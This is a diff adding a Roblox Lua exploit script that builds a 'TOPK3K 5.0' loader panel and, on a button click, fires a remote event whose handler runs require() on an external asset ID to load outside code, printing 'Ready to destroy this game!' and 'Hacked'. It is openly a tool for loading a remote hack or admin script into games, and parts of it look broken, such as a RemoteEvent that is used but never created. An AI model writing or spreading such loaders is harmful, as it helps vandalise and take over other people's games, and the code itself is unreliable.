@@ -1,0 +1,91 @@
+-- Topkek is back!
+-- Instances:
+
+local admin = Instance.new("ScreenGui")
+local ok = Instance.new("Frame")
+local load1 = Instance.new("TextButton")
+local logo = Instance.new("TextLabel")
+local credit = Instance.new("TextLabel")
+
+--Properties:
+
+admin.Name = "admin"
+admin.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+admin.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+ok.Name = "ok"
+ok.Parent = admin
+ok.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
+ok.BorderSizePixel = 0
+ok.Position = UDim2.new(0.666055024, 0, 0.537373722, 0)
+ok.Size = UDim2.new(0, 309, 0, 198)
+
+load1.Name = "load1"
+load1.Parent = ok
+load1.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+load1.BorderSizePixel = 0
+load1.Position = UDim2.new(0.0906148851, 0, 0.646464646, 0)
+load1.Size = UDim2.new(0, 252, 0, 31)
+load1.Font = Enum.Font.SourceSansLight
+load1.Text = "Load GUI"
+load1.TextColor3 = Color3.fromRGB(255, 255, 255)
+load1.TextScaled = true
+load1.TextSize = 14.000
+load1.TextWrapped = true
+
+logo.Name = "logo"
+logo.Parent = ok
+logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+logo.BackgroundTransparency = 1.000
+logo.BorderSizePixel = 0
+logo.Position = UDim2.new(0.152103573, 0, 0.0959595963, 0)
+logo.Size = UDim2.new(0, 215, 0, 77)
+logo.Font = Enum.Font.SourceSansBold
+logo.Text = "TOPK3K 5.0"
+logo.TextColor3 = Color3.fromRGB(255, 255, 255)
+logo.TextScaled = true
+logo.TextSize = 14.000
+logo.TextWrapped = true
+
+credit.Name = "credit"
+credit.Parent = ok
+credit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+credit.BackgroundTransparency = 1.000
+credit.BorderSizePixel = 0
+credit.Position = UDim2.new(0.148867309, 0, 0.444444448, 0)
+credit.Size = UDim2.new(0, 215, 0, 21)
+credit.Font = Enum.Font.SourceSansBold
+credit.Text = "Revamped, made by Elliot."
+credit.TextColor3 = Color3.fromRGB(255, 255, 255)
+credit.TextScaled = true
+credit.TextSize = 14.000
+credit.TextWrapped = true
+
+-- Scripts:
+
+local function THUCU_fake_script() -- load1.LocalScript 
+	local script = Instance.new('LocalScript', load1)
+
+	local remote = script.Parent.RemoteEvent
+	local plr = game.Players.LocalPlayer
+	local gui = script.Parent.Parent.Parent
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		remote:FireServer()
+		gui.Enabled = false
+		print("Ready to destroy this game!")
+	end)
+end
+coroutine.wrap(THUCU_fake_script)()
+local function VDDLQ_fake_script() -- load1.Script 
+	local script = Instance.new('Script', load1)
+
+	local server = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents").UnMutePlayerRequest
+	local remotereq = script.Parent.RemoteEvent
+	
+	remotereq.OnServerEvent:Connect(function()
+		server:InvokeServer(require(5610305900)(game.Players.LocalPlayer.Name))
+		print("Hacked")
+	end)
+end
+coroutine.wrap(VDDLQ_fake_script)()
